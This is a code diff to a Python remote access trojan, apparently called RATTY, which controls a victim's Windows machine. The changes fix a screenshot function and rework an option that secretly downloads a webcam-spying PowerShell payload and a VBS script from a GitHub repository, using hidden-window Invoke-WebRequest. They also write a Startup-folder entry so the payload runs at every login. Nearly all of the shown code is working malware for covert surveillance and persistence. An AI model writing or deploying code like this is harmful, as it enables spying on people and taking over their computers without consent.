@@ -179,7 +179,7 @@ def current_time():
 def Grab_ScreenShot(address,password,working,username):
     # make the command to take the screenshot
     print("[*] Taking the screenshot.........")
-    take_screenshot_command=f'cd {working} && mkdir ASGHbvcQPW && powershell powershell.exe .\\UEsQRWCLHV.ps1 > ASGHbvcQPW'
+    take_screenshot_command=f'cd {working} && mkdir ASGHbvcQPW && powershell Start-Process powershell.exe -noexit -file "$env:temp/UEsQRWCLHV.ps1"'
     remote_commands(address, password, take_screenshot_command)
 
     print("\n[*] screenshot taken successfully AND SAVED TO ASGHbvcQPW FOLDER\n")
@@ -324,7 +324,7 @@ def cli(argument):
             except Exception as e:
                 pass
         elif option=="4":
-            Grab_ScreenShot(ipv4,password,target_username,working_directory)
+            Grab_ScreenShot(ipv4,password,working_directory,target_username)
         elif option=="5":
             upload(ipv4,password,working_directory)
         elif option=="6":
@@ -334,12 +334,12 @@ def cli(argument):
         elif option =='8':
             # make the command to take the screenshot
             print("[*] installing the screenshot.........")
-            install_webcam=f'cd {working_directory}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/webcam.exe -OutFile YiBLGRwMDS.exe'
+            install_webcam=f'cd {working_directory}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/webcam.ps1 -OutFile YiBLGRwMDS.ps1'
             install_confirmation=f'cd {working_directory}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/confirm-cam.vbs -OutFile ecuxdyWXkT.vbs'
             # run the commnads
             remote_commands(address, password, install_webcam)
             # add to startup directory
-            add_to_startup=f'cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && echo powershell.exe  -windowstyle hidden -File {working}/YiBLGRwMDS.exe >> BEkxzUzcnT.cmd'
+            add_to_startup=f'cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/YiBLGRwMDS.ps1 >> BEkxzUzcnT.cmd'
             remote_commands(address, password, add_to_startup)
 
         elif option=="9":
